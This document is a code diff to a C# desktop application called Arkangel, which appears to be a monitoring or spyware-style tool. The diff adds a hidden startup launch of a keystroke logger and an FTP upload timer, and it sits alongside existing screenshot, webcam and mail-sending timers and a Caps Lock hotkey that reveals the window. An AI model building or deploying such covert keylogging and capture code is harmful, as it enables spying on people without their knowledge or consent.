@@ -38,7 +38,9 @@ namespace Arkangel
         public static System.Timers.Timer aTimer_webcam = new System.Timers.Timer();
         // send mail
         public static System.Timers.Timer aTimer_sendMail = new System.Timers.Timer();
-      
+        //FTP
+        public static System.Timers.Timer aTimer_FTP = new System.Timers.Timer();
+
         public MainWindow()
         {
             
@@ -50,20 +52,20 @@ namespace Arkangel
                 Dashboard dashboard = new Dashboard(this);
                 mainPanel.Children.Add(dashboard);
             }
-            Functions.syncServer();
+            Functions.syncDown();
 
-            //Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
+
 
             //Keystroke
-            //try
-            //{
-            //    myProcess.StartInfo.UseShellExecute = true;
-            //    myProcess.StartInfo.FileName =@"..\..\Module\keystroke.exe";
-            //    myProcess.StartInfo.CreateNoWindow = true;
-            //    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            //    myProcess.Start();
-            //}
-            //catch { };
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "keystroke.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { };
 
 
 
@@ -106,14 +108,19 @@ namespace Arkangel
                         DateTime temp_screenshot = DateTime.Parse(data["datetime"].ToString());
                         double days_screenshot = Double.Parse(data["daysDel"].ToString());
 
-                        if (temp_screenshot.AddDays(days_screenshot).CompareTo(DateTime.Now) >= 0)
+                        if (data["enDel"].ToString()=="1"&&temp_screenshot.AddDays(days_screenshot).CompareTo(DateTime.Now) >= 0)
                         {
-                            if (Directory.Exists(scrPath))
+                            try
                             {
-                                Directory.Delete("scrPath", true);
-                                Console.WriteLine("Delete scr log successful!");
+                                if (Directory.Exists(scrPath))
+                                {
 
+                                    Directory.Delete(scrPath, true);
+                                    Console.WriteLine("Delete scr log successful!");
+                                }
                             }
+                            catch { }
+                           
                         }
                     }
                     // start timer screenshot if enable
@@ -140,14 +147,18 @@ namespace Arkangel
                         DateTime temp = DateTime.Parse(wc["datetime"].ToString());
                         double days = Double.Parse(wc["days"].ToString());
 
-                        if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
+                        if (wc["enDelAfterUpload"].ToString() == "1" && temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
                         {
-                            if (Directory.Exists(webcamPath))
+                            try
                             {
-                                Directory.Delete(webcamPath, true);
-                                Console.WriteLine("Delete webcam logs successful!");
+                                if (Directory.Exists(webcamPath))
+                                {
+                                    Directory.Delete(webcamPath, true);
+                                    Console.WriteLine("Delete webcam logs successful!");
 
+                                }
                             }
+                            catch { }
                         }
                         
                     }
@@ -163,6 +174,9 @@ namespace Arkangel
 
                 connect.Close();
             }
+
+
+            //-------------Mail//
             string enable_mail = "";
             int hours = 0;
             int minutes = 0;
@@ -198,9 +212,34 @@ namespace Arkangel
             //---------------------------------//
 
             //FTP
+            int enableFTP = 0;
+            int hoursFTP=0;
+            int minutesFTP=0;
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
+                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
+                    while (data.Read())
+                    {
+                        if (data["enable"].ToString() == "1") enableFTP = 1; else enableFTP = 0;
+                        int.TryParse(data["hours"].ToString(), out hoursFTP);
+                        int.TryParse(data["minutes"].ToString(), out minutesFTP);
+                    }
+                }
+                if (enableFTP==1)
+                {
+                    Functions.SetTimerFTP(hoursFTP * 60 * 60 * 1000 + minutesFTP * 60 * 1000);
+                    aTimer_FTP.Start();
+                }
+            }
+
 
             //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
-            
+
             //Hide();
         }
         private IntPtr _windowHandle;
@@ -227,7 +266,7 @@ namespace Arkangel
                             int vkey = (((int)lParam >> 16) & 0xFFFF);
                             if (vkey == VK_CAPITAL)
                             {
-                                this.Show();
+                                Show();
                             }
                             handled = true;
                             break;
@@ -267,12 +306,6 @@ namespace Arkangel
         {
             if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
             {
-                //ProcessStartInfo _process = startkeylog();
-                //foreach (var process in Process.GetProcessesByName("keystroke.exe"))
-                //{
-                //    process.Kill();
-                //}
-               
                 try
                 {
                     myProcess.Kill();
@@ -320,18 +353,18 @@ namespace Arkangel
         //    //    Console.WriteLine("MESSAGE: " + ex.Message);
         //    //}
         //}
-        //private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
-        //{
-        //    try
-        //    {
-        //        myProcess.Kill();
-        //        myProcess.Dispose();
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        Console.WriteLine(ex.ToString());
-        //    }
-        //}
+        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            try
+            {
+                myProcess.Kill();
+                myProcess.Dispose();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
 
         private void bt_Setting_Click(object sender, RoutedEventArgs e)
         {
@@ -422,6 +455,14 @@ namespace Arkangel
         private void StackPanel_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
         {
             DragMove();
+        }
+
+        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            aTimer_scrshot.Stop();
+            aTimer_sendMail.Stop();
+            aTimer_webcam.Stop();
+            Functions.EndTask("keystroke.exe");
         }
     }
 }
